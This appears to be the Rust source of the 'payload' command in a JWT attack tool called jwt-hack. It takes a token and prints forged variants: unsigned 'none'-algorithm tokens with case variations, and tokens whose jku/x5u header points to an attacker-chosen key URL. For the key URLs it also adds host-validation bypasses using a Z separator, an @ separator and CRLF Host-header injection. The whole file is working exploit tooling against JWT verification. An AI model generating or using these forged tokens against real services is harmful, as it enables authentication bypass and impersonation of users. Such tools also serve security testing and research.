use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use log::info;
use serde_json::json;
use colored::Colorize;

use crate::jwt;
use crate::utils;

/// Execute the payload command
pub fn execute(token: &str, jwk_trust: Option<&str>, jwk_attack: Option<&str>, jwk_protocol: &str) {
    utils::log_info(format!("Generating attack payloads for token: {}", utils::format_jwt_token(token)));
    if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol) {
        utils::log_error(format!("Error generating payloads: {}", e));
        utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com");
    }
}

fn generate_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
) -> Result<()> {
    // Decode the JWT token to get claims
    let decoded = jwt::decode(token)?;
    let _claims_json = serde_json::to_string(&decoded.claims)?;

    // Split token to get the claims part
    let token_parts: Vec<&str> = token.split('.').collect();
    if token_parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid JWT token format"));
    }

    let claims_part = token_parts[1];

    utils::log_info("Generating 'none' algorithm attack payloads");
    let spinner = utils::start_progress("Creating none algorithm variants...");
    
    // Generate none algorithm payloads
    generate_none_payloads(claims_part, "none")?;
    generate_none_payloads(claims_part, "NonE")?;
    generate_none_payloads(claims_part, "NONE")?;
    
    spinner.finish_and_clear();

    // Generate URL payloads if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        utils::log_info(format!("Generating URL-based attack payloads using domain: {}", attack_domain.bright_yellow()));
        let spinner = utils::start_progress("Creating JKU and X5U payloads...");
        
        generate_url_payloads(claims_part, jwk_trust, attack_domain, jwk_protocol)?;
        
        spinner.finish_and_clear();
    } else {
        utils::log_warning("No attack domain provided. Skipping URL-based payloads.");
        utils::log_info("To generate URL payloads, use --jwk-attack parameter.");
    }

    Ok(())
}

fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
    // Create header with none algorithm
    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    let header_json = serde_json::to_string(&header)?;
    info!(
        "Generate {} payload header=\"{}\" payload={}",
        alg_value, header_json, alg_value
    );

    // Encode header to base64
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());

    // Format as JWT (without signature)
    println!("\n{}", format!("━━━ None Algorithm Payload ({}) ━━━", alg_value).bright_cyan().bold());
    println!("{}", format!("{}.{}", 
        encoded_header.bright_blue(),
        claims.bright_magenta()));
    println!();

    Ok(())
}

fn generate_url_payloads(
    claims: &str,
    jwk_trust: Option<&str>,
    jwk_attack: &str,
    jwk_protocol: &str,
) -> Result<()> {
    let jku_payloads = [
        ("jku", jwk_attack.to_string()),
        ("x5u", jwk_attack.to_string()),
    ];

    for (key_type, domain) in jku_payloads {
        // Basic payload
        let header = json!({
            "alg": "hs256",
            key_type: domain,
            "typ": "JWT"
        });

        let header_json = serde_json::to_string(&header)?;
        info!(
            "Generate {} + basic payload header=\"{}\" payload={}",
            key_type, header_json, key_type
        );

        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        println!("\n{}", format!("━━━ JKU/X5U Basic Payload ({}) ━━━", key_type).bright_cyan().bold());
        println!("{}", format!("{}.{}", 
            encoded_header.bright_blue(),
            claims.bright_magenta()));
        println!();

        // If trust domain is provided, generate bypass payloads
        if let Some(trust_domain) = jwk_trust {
            // Bypass host validation - Z separator
            let bypass_z_url = format!("{}://{}{}{}", jwk_protocol, trust_domain, "Z", jwk_attack);
            let header = json!({
                "alg": "hs256",
                key_type: bypass_z_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host validation payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!("\n{}", format!("━━━ Z-Separator Bypass Payload ({}) ━━━", key_type).bright_cyan().bold());
            println!("{}", format!("{}.{}", 
                encoded_header.bright_blue(),
                claims.bright_magenta()));
            println!();

            // Bypass host validation - @ separator
            let bypass_at_url = format!("{}://{}@{}", jwk_protocol, trust_domain, jwk_attack);
            let header = json!({
                "alg": "hs256",
                key_type: bypass_at_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host validation payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!("\n{}", format!("━━━ @-Separator Bypass Payload ({}) ━━━", key_type).bright_cyan().bold());
            println!("{}", format!("{}.{}", 
                encoded_header.bright_blue(),
                claims.bright_magenta()));
            println!();

            // Host header injection with CRLF
            let crlf_url = format!(
                "{}://{}%0d0aHost: {}",
                jwk_protocol, trust_domain, jwk_attack
            );
            let header = json!({
                "alg": "hs256",
                key_type: crlf_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!("\n{}", format!("━━━ CRLF Injection Payload ({}) ━━━", key_type).bright_cyan().bold());
            println!("{}", format!("{}.{}", 
                encoded_header.bright_blue(),
                claims.bright_magenta()));
            println!();
        }
    }

    Ok(())
}
